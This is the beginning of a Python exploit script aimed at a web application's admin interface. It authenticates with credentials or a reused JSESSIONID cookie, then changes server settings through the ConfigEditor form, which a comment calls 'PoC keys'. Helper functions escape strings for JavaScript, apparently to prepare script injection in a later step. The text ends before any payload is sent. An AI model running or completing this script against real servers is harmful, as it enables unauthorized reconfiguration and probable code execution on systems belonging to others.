#!/usr/bin/python3
import argparse, base64, os, shlex, sys, time, uuid
import requests, urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def js_str(s):
    """Single-quoted, safe JavaScript string literal (backslash/quote/unicode escaped)."""
    out = []
    for ch in s:
        o = ord(ch)
        if ch == '\\': out.append('\\\\')
        elif ch == "'": out.append("\\'")
        elif ch == '\n': out.append('\\n')
        elif ch == '\r': out.append('\\r')
        elif ch == '\t': out.append('\\t')
        elif o < 32 or o == 127 or o > 126: out.append('\\u%04x' % o)
        else: out.append(ch)
    return "'" + ''.join(out) + "'"


def js_strlist(items):
    return '[' + ', '.join(js_str(i) for i in items) + ']'


# ---------------------------------------------------------------- auth ------
def get_session_id(base_url, username=None, password=None, jsessionid=None):
    s = requests.Session()
    if jsessionid:
        s.cookies.set('JSESSIONID', jsessionid)
        print('[+] Reusing JSESSIONID cookie')
        return s
    s.get(f'{base_url}/app?service=page/Login', verify=False)
    data = {
        'service': 'direct/1/Login/$Form',
        'sp': 'S0',
        'Form0': '$TextField$0,$PasswordField$0,$Checkbox$0,$SubmitName',
        '$TextField$0': username,
        '$PasswordField$0': password,
        '$Checkbox$0': 'on',
        '$SubmitName': 'Login',
    }
    r = s.post(f'{base_url}/app', data=data, headers={'Origin': base_url}, verify=False)
    if r.status_code == 200 and 'JSESSIONID' in s.cookies.get_dict():
        print(f'[+] Authenticated as {username}')
        return s
    print('[-] Login failed — use --cookie <JSESSIONID>')
    return None


# ------------------------------------------- config toggles (your PoC keys) --
def set_setting(base_url, session, setting, enabled):
    headers = {'Origin': base_url}
    session.post(f'{base_url}/app', data={
        'service': 'direct/1/ConfigEditor/quickFindForm',
        'sp': 'S0',
        'Form0': '$TextField,doQuickFind,clear',
        '$TextField': setting,
        'doQuickFind': 'Go'}, headers=headers, verify=False)
    session.post(f'{base_url}/app', data={
        'service': 'direct/1/ConfigEditor/$Form',
        'sp': 'S1',
        'Form1': '$TextField$0,$Submit,$Submit$0',
        '$TextField$0': enabled,
        '$Submit': 'Update'}, headers=headers, verify=False)


